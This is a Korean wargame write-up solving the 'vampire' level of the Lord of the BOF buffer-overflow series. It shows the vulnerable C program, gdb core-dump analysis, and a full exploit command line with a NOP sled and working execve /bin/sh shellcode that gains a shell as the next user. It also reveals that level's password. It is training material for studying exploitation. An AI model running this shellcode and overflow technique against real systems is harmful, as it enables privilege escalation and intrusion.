# vampire

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - vampire
        - check 0xbfff
*/

#include <stdio.h>
#include <stdlib.h>

main(int argc, char *argv[])
{
        char buffer[40];

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }

        // here is changed!
        if(argv[1][46] == '\xff')
        {
                printf("but it's not forever\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);
}
```

stack에서 argv로 들어가는 부분이 0xbfff으로 시작한다. 

문제에서 힌트가 될만한 부분이 but it's not forever라고 적혀있는 부분이다.

혹시나 해서 argv[1]인자값으로 백만개의 NOP sled를 만들고 입력해보았다.	

```bash
[troll@localhost troll]$  ./aaaaaaa `python -c 'print "\x90"*44+"\xbf\xbf\xbf\xbf"+"\x90"*1000000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'`
bash2: ./aaaaaaa: Argument list too long
```

너무 길어서 만들 수 없다고 한다. 그래서 50만해보고 또 안되서 10만까지 해보았더니 생성되서 core 파일을 분석해 ret부분 주소를 찾고 공격 코드를 완성했다. 

```bash
[troll@localhost troll]$ gdb -c core -q
Core was generated by `▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒'.
Program terminated with signal 11, Segmentation fault.
#0  0xbfbfbfbf in ?? ()
(gdb) x/100x $es
0x2b:   Cannot access memory at address 0x2b
(gdb) x/100x $esp
0xbffe7420:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe7430:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe7440:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe7450:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe7460:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe7470:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe7480:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe7490:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe74a0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe74b0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe74c0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe74d0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe74e0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe74f0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe7500:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe7510:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe7520:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe7530:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe7540:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe7550:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe7560:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe7570:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe7580:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe7590:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffe75a0:     0x90909090      0x90909090      0x90909090      0x90909090
```

ret 주소로 argv[1] [46]자리에 0xff가 없는 0xbffe7510을 선택하고 공격했더니 성공했다.

```bash
[troll@localhost troll]$  ./vampire `python -c 'print "\x90"*44+"\x10\x75\xfe\xbf"+"\x90"*100000+"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'`
...(너무 길어서 생략)...
bash$ whoami
vampire
bash$ my-pass
euid = 509
music world
```

vampire의 password는 music world이다.

